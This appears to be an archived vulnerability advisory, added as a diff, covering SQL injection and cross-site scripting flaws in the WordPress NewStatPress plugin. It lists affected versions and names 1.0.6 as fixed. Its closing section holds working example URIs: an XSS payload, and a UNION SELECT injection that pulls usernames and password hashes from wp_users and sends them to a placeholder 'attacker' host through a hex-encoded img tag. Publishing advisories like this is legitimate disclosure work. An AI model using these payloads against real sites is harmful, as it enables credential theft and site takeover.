@@ -1,0 +1,103 @@
+#SpeeDr00t@Black Falcon<br>#bid75575<p><b><span style="font-size: 18pt;">WordPress NewStatPress Plugin SQL Injection and Cross Site Scripting Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/75575/info">info</a><br><a href="http://www.securityfocus.com/bid/75575/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/75575/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/75575/solution">solution</a><br><a href="http://www.securityfocus.com/bid/75575/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				75575
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jul 07 2015 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 07 2015 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				g0blin
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					WordPress NewStatPress 0.9.9 <br/>
+					
+				
+					WordPress NewStatPress 0.9.8 <br/>
+					
+				
+					WordPress NewStatPress  1.0.4<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					WordPress NewStatPress 1.0.6 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can use a browser to exploit the SQL-injection issue. An attacker must trick a victim into following a malicious URI to exploit cross-site scripting issue.<br/><br/>The following example URIs are available:<br/><br/>http://www.example.com/wp-admin/admin.php?groupby1=checked%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29&amp;amp;page=nsp_search&amp;amp;newstatpress_action=search<br/><br/>http://www.example.com/wp-admin/admin.php?where1=ip&amp;amp;what1=0&amp;amp;where2=spider+%3D+0+UNION+SELECT+CONCAT%280x3C696D67207372633D22687474703A2F2F61747461636B65722F3F63726564733D%2C%28select+hex%28group_concat%28concat_ws%28char%2858%29%2Cwp_users.user_login%2Cwp_users.user_pass%29%29%29+from+wp_users+group+by+1%3D1%29%2C0x223e%29--&amp;amp;what2=0&amp;amp;searchsubmit=Search&amp;amp;page=nsp_search&amp;amp;newstatpress_action=search
+	
+		<ul>
+</ul>
+</div>
